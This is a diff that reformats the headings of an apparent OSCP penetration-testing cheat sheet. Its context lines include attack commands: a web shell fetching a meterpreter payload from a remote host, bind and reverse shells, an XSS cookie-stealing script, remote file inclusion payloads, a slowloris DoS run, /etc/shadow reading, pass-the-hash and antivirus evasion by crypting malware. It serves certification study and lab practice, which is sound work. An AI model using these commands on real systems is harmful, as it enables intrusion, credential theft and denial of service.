@@ -1,7 +1,8 @@
 # OSCP-Survival-Guide
 Kali Linux Offensive Security Certified Professional Survival Exam Guide 
-OSCP Course Review
-==================
+
+<span id="_d5in22sbolyc" class="anchor"><span id="_Toc480741797" class="anchor"></span></span>OSCP Course Review
+================================================================================================================
 
 -   Offensive Security’s PWB and OSCP — My Experience  
     [*http://www.securitysift.com/offsec-pwb-oscp/*](http://www.securitysift.com/offsec-pwb-oscp/)
@@ -16,8 +17,8 @@ OSCP Course Review
 
 [*http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html*](http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html)
 
-OSCP Inspired VMs and Walkthroughs
-==================================
+<span id="_pxmpirqr11x0" class="anchor"><span id="_Toc480741798" class="anchor"></span></span>OSCP Inspired VMs and Walkthroughs
+================================================================================================================================
 
 -   [*https://www.vulnhub.com/*](https://www.vulnhub.com/)  
     [*https://www.root-me.org/*](https://www.root-me.org/)
@@ -47,8 +48,8 @@ OSCP Inspired VMs and Walkthroughs
     Tr0ll-2  
     [*https://www.vulnhub.com/entry/tr0ll-2,107/*](https://www.vulnhub.com/entry/tr0ll-2,107/)
 
-Cheat Sheets
-============
+<span id="_kfwx4om2dsj4" class="anchor"><span id="_Toc480741799" class="anchor"></span></span>Cheat Sheets
+==========================================================================================================
 
 -   Penetration Tools Cheat Sheet  
     [*https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/*](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)
@@ -112,8 +113,8 @@ Cheat Sheets
 
 -   [*http://h.ackack.net/cheat-sheets/netcat*](http://h.ackack.net/cheat-sheets/netcat)
 
-Essentials
-==========
+<span id="_u0jmfst1vd5j" class="anchor"><span id="_Toc480741800" class="anchor"></span></span>Essentials
+========================================================================================================
 
 -   Exploit-db  
     [*https://www.exploit-db.com/*](https://www.exploit-db.com/)
@@ -138,8 +139,8 @@ Essentials
 -   Metasploit Unleashed - free course on how to use Metasploit  
     [*https://www.offensive-security.com/metasploit-unleashed*](https://www.offensive-security.com/metasploit-unleashed/)*/*
 
-1,2 - Kali Linux
-================
+<span id="_hjn6h4eyfk2e" class="anchor"><span id="_Toc480741801" class="anchor"></span></span>Kali Linux
+========================================================================================================
 
 -   Set the Target IP Address to the $ip system variable  
     export ip=192.168.1.100
@@ -272,11 +273,11 @@ Essentials
         iptables -A INPUT -p tcp --destination-port 4444 \\! -d $ip -j
         DROP
 
-3,4,5 - Information Gathering & Vulnerability Scanning
-======================================================
+<span id="_8ycb0mapaec8" class="anchor"><span id="_Toc480741802" class="anchor"></span></span>Information Gathering & Vulnerability Scanning
+============================================================================================================================================
 
--   Passive Information Gathering
-    -----------------------------
+-   <span id="_buep9pyclcqm" class="anchor"><span id="_Toc480741803" class="anchor"></span></span>Passive Information Gathering
+    ---------------------------------------------------------------------------------------------------------------------------
 
 -   Google Hacking
 
@@ -329,8 +330,8 @@ Essentials
         show modules  
         help
 
--   Active Information Gathering
-    ----------------------------
+-   <span id="_freheegw7nba" class="anchor"><span id="_Toc480741804" class="anchor"></span></span>Active Information Gathering
+    --------------------------------------------------------------------------------------------------------------------------
 
 <!-- -->
 
@@ -368,8 +369,8 @@ Essentials
     -   DNSEnum  
         dnsenum zonetransfer.me
 
--   Port Scanning
-    -------------
+-   <span id="_rg4aghc59hwr" class="anchor"><span id="_Toc480741805" class="anchor"></span></span>Port Scanning
+    -----------------------------------------------------------------------------------------------------------
 
     -   Set the ip address as a varble  
         export ip=192.168.1.100  
@@ -442,6 +443,9 @@ Essentials
     -   Scan with Active connect in order to weed out any spoofed ports
         designed to troll you  
         nmap -p1-65535 -A -T5 -sT $ip
+
+-   Enumeration
+    -----------
 
 -   NMap Enumeration Script List:
 
@@ -582,6 +586,42 @@ Essentials
         iptables -vL -t raw  
         iptables -vL -t security
 
+-   Vulnerability Scanning with Nmap
+
+-   Nmap Exploit Scripts  
+    [*https://nmap.org/nsedoc/categories/exploit.html*](https://nmap.org/nsedoc/categories/exploit.html)
+
+-   Nmap search through vulnerability scripts  
+    cd /usr/share/nmap/scripts/  
+    ls -l \*vuln\*
+
+-   Nmap search through Nmap Scripts for a specific keyword  
+    ls /usr/share/nmap/scripts/\* | grep ftp
+
+-   Scan for vulnerable exploits with nmap  
+    nmap --script exploit -Pn $ip
+
+-   NMap Auth Scripts  
+    [*https://nmap.org/nsedoc/categories/auth.html*](https://nmap.org/nsedoc/categories/auth.html)
+
+-   Nmap Vuln Scanning  
+    [*https://nmap.org/nsedoc/categories/vuln.html*](https://nmap.org/nsedoc/categories/vuln.html)
+
+-   NMap DOS Scanning  
+    nmap --script dos -Pn $ip  
+    NMap Execute DOS Attack  
+    nmap --max-parallelism 750 -Pn --script http-slowloris --script-args
+    http-slowloris.runforever=true
+
+-   Scan for coldfusion web vulnerabilities  
+    nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip
+
+-   Anonymous FTP dump with Nmap  
+    nmap -v -p 21 --script=ftp-anon.nse $ip-254
+
+-   SMB Security mode scan with Nmap  
+    nmap -v -p 21 --script=ftp-anon.nse $ip-254
+
 -   File Enumeration
 
     -   Find UID 0 files root execution
@@ -605,7 +645,8 @@ Essentials
         strings &lt;filename&gt;
 
     -   Determine the type of a file  
-        file &lt;filename&gt;
+        file &lt;filename&gt;<span id="_y3fyiaz7kx9m"
+        class="anchor"></span>
 
 -   HTTP Enumeration
     ----------------
@@ -688,44 +729,6 @@ Essentials
 >
 > apt-get install stegosuite
 
--   Vulnerability Scanning with Nmap
-
-    -   Nmap Exploit Scripts  
-        [*https://nmap.org/nsedoc/categories/exploit.html*](https://nmap.org/nsedoc/categories/exploit.html)
-
-    -   Nmap search through vulnerability scripts  
-        cd /usr/share/nmap/scripts/  
-        ls -l \*vuln\*
-
-    -   Nmap search through Nmap Scripts for a specific keyword  
-        ls /usr/share/nmap/scripts/\* | grep ftp
-
-    -   Scan for vulnerable exploits with nmap  
-        nmap --script exploit -Pn $ip
-
-    -   NMap Auth Scripts  
-        [*https://nmap.org/nsedoc/categories/auth.html*](https://nmap.org/nsedoc/categories/auth.html)
-
-    -   Nmap Vuln Scanning  
-        [*https://nmap.org/nsedoc/categories/vuln.html*](https://nmap.org/nsedoc/categories/vuln.html)
-
-    -   NMap DOS Scanning  
-        nmap --script dos -Pn $ip  
-        NMap Execute DOS Attack  
-        nmap --max-parallelism 750 -Pn --script http-slowloris
-        --script-args http-slowloris.runforever=true
-
-    -   Scan for coldfusion web vulnerabilities  
-        nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip
-
-    -   Anonymous FTP dump with Nmap  
-        nmap -v -p 21 --script=ftp-anon.nse $ip-254
-
-    -   SMB Security mode scan with Nmap  
-        nmap -v -p 21 --script=ftp-anon.nse $ip-254
-
-    -   
-
 -   The OpenVAS Vulnerability Scanner
 
     -   apt-get update  
@@ -737,8 +740,8 @@ Essentials
     -   Login at:  
         https://$ip:9392
 
-6,7,8,9 - Buffer Overflows, Exploits and Shells
-===============================================
+<span id="_gpeqrdf839p2" class="anchor"><span id="_Toc480741808" class="anchor"></span></span>Buffer Overflows, Exploits and Shells
+===================================================================================================================================
 
 -   DEP and ASLR - Data Execution Prevention (DEP) and Address Space
     Layout Randomization (ASLR)
@@ -842,8 +845,8 @@ Essentials
     -   Connect to the shell with netcat:  
         nc -v $ip 4444
 
--   Exploits
-    --------
+-   <span id="_6isnoas6fx9r" class="anchor"><span id="_Toc480741809" class="anchor"></span></span>Exploits
+    ------------------------------------------------------------------------------------------------------
 
 -   Searching for Exploits
 
@@ -860,8 +863,8 @@ Essentials
 -   Precompiled Linux Kernel Exploits  
     [*https://www.kernel-exploits.com/*](https://www.kernel-exploits.com/)
 
--   Shells
-    ------
+-   <span id="_a0s3gfvq9awf" class="anchor"><span id="_Toc480741810" class="anchor"></span></span>Shells
+    ----------------------------------------------------------------------------------------------------
 
 -   Upload and execute a meterpreter shell using a web shell  
     curl -s --data "cmd=wget http://10.9.0.2:8000/dhn -O /tmp/evil"
@@ -902,7 +905,7 @@ Essentials
     from busybox  
     /bin/busybox telnetd -|/bin/sh -p9999
 
--   -   -   Pen test monkey PHP reverse shell  
+-   Pen test monkey PHP reverse shell  
     [*http://pentestmonkey.net/tools/web-shells/php-reverse-shel*](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 -   php-findsock-shell - turns PHP port 80 into an interactive shell  
@@ -998,8 +1001,8 @@ Essentials
     -   Nmap DNS Fuzzer  
         nmap --script dns-fuzz --script-args timelimit=2h $ip -d
 
-10 - File Transfers
-===================
+<span id="_x5s578fjasl7" class="anchor"><span id="_Toc480741811" class="anchor"></span></span>File Transfers
+============================================================================================================
 
 -   Post exploitation refers to the actions performed by an attacker,
     once some level of control has been gained on his target.
@@ -1032,8 +1035,8 @@ Essentials
     nmap -p80 $ip --script http-put --script-args
     http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
 
--   Uploading Files
-    ---------------
+-   <span id="_7d17079zlg8e" class="anchor"><span id="_Toc480741812" class="anchor"></span></span>Uploading Files
+    -------------------------------------------------------------------------------------------------------------
 
     -   Upload shell using limited php shell cmd  
         use the webshell to download and execute the meterpreter  
@@ -1083,11 +1086,11 @@ Essentials
         cd setup  
         setup.sh -c
 
-11 - Privilege Escalation
-=========================
+<span id="_603sebbhi52g" class="anchor"><span id="_Toc480741813" class="anchor"></span></span>Privilege Escalation
+==================================================================================================================
 
--   Linux Privilege Escalation
-    --------------------------
+-   <span id="_8xvj7n3ui3gv" class="anchor"><span id="_Toc480741814" class="anchor"></span></span>Linux Privilege Escalation
+    ------------------------------------------------------------------------------------------------------------------------
 
 -   Try the obvious - Maybe the user can sudo to root:  
     sudo su
@@ -1169,8 +1172,8 @@ Essentials
         setuid(0);\\nsystem(\\"/bin/sh\\");\\n}" &gt;privsc.c  
         gcc privsc.c -o privsc
 
--   Windows Privilege Escalation
-    ----------------------------
+-   <span id="_jo4fgtcuuk6l" class="anchor"><span id="_Toc480741815" class="anchor"></span></span>Windows Privilege Escalation
+    --------------------------------------------------------------------------------------------------------------------------
 
 -   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
     python pyinstaller.py --onefile ms11-080.py  
@@ -1273,11 +1276,11 @@ Essentials
 -   Collect root password  
     cat /etc/shadow |grep root
 
-12,13,14 - Client, Web and Password Attacks
-===========================================
+<span id="_pht6nag264ji" class="anchor"><span id="_Toc480741816" class="anchor"></span></span>Client, Web and Password Attacks
+==============================================================================================================================
 
--   Client Attacks
-    --------------
+-   <span id="_pcjm0n4oppqx" class="anchor"><span id="_Toc480741817" class="anchor"></span></span>Client Attacks
+    ------------------------------------------------------------------------------------------------------------
 
     -   MS12-037- Internet Explorer 8 Fixed Col Span ID  
         wget -O exploit.html
@@ -1302,8 +1305,8 @@ Essentials
         backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip
         -P 4444 -s reverse\_shell\_tcp
 
--   Web Attacks
-    -----------
+-   <span id="_n6fr3j21cp1m" class="anchor"><span id="_Toc480741818" class="anchor"></span></span>Web Attacks
+    ---------------------------------------------------------------------------------------------------------
 
     -   Web Shag Web Application Vulnerability Assessment Platform  
         webshag-gui
@@ -1347,8 +1350,8 @@ Essentials
         &lt;/script&gt;  
         nc -nlvp 80
 
--   File Inclusion Vulnerabilities 
-    -------------------------------
+-   <span id="_bf4kx5ncvlwa" class="anchor"><span id="_Toc480741819" class="anchor"></span></span>File Inclusion Vulnerabilities 
+    -----------------------------------------------------------------------------------------------------------------------------
 
     -   Local (LFI) and remote (RFI) file inclusion vulnerabilities are
         commonly found in poorly written PHP code.
@@ -1431,8 +1434,8 @@ Essentials
         [http://$ip/addguestbook.php?name=a&comment=b&LANG=http://$localip/evil.txt](http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt)  
         &lt;?php echo shell\_exec("ipconfig");?&gt;
 
--   Database Vulnerabilities
-    ------------------------
+-   <span id="_mgu7e3u7svak" class="anchor"><span id="_Toc480741820" class="anchor"></span></span>Database Vulnerabilities
+    ----------------------------------------------------------------------------------------------------------------------
 
     -   MySQL SQL
 
@@ -1540,8 +1543,8 @@ Essentials
 > sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL"
 > --dbs
 
--   Password Attacks
-    ----------------
+-   <span id="_d4rul8c0g2bt" class="anchor"><span id="_Toc480741821" class="anchor"></span></span>Password Attacks
+    --------------------------------------------------------------------------------------------------------------
 
     -   AES Decryption  
         http://aesencryption.net/
@@ -1670,8 +1673,8 @@ Essentials
         -   Hydra attack http get 401 login with a dictionary  
             hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
 
--   Password Hash Attacks
-    ---------------------
+-   <span id="_bnmnt83v58wk" class="anchor"><span id="_Toc480741822" class="anchor"></span></span>Password Hash Attacks
+    -------------------------------------------------------------------------------------------------------------------
 
     -   Online Password Cracking  
         [*https://crackstation.net/*](https://crackstation.net/)
@@ -1717,8 +1720,8 @@ Essentials
           
         pth-winexe -U administrator //$ip cmd
 
-15 - Networking, Pivoting and Tunneling
-=======================================
+<span id="_6nmbgmpltwon" class="anchor"><span id="_Toc480741823" class="anchor"></span></span>Networking, Pivoting and Tunneling
+================================================================================================================================
 
 -   Port Forwarding - accept traffic on a given IP address and port and
     redirect it to a different IP address and port
@@ -1900,8 +1903,8 @@ Essentials
         https://github.com/lukebaggett/dnscat2-powershell/  
         dnscat --host &lt;dnscat server\_ip&gt;
 
-16 - The Metasploit Framework
-=============================
+<span id="_ujpvtdpc9i67" class="anchor"><span id="_Toc480741824" class="anchor"></span></span>The Metasploit Framework
+======================================================================================================================
 
 -   See [*Metasploit Unleashed
     Course*](https://www.offensive-security.com/metasploit-unleashed/)
@@ -2045,8 +2048,8 @@ Essentials
     -   Create a Meterpreter background session  
         background
 
-17 - Bypassing Antivirus Software 
-==================================
+<span id="_51btodqc88s2" class="anchor"><span id="_Toc480741825" class="anchor"></span></span>Bypassing Antivirus Software 
+===========================================================================================================================
 
 -   Crypting Known Malware with Software Protectors
 
@@ -2062,4 +2065,5 @@ Essentials
         .  
         wine hyperion.exe ../backdoor.exe ../crypted.exe
 
--   Using Custom/Uncommon Tools and Payloads
+-   Using Custom/Uncommon Tools and Payloads<span id="_2nz8rskeai36"
+    class="anchor"></span>
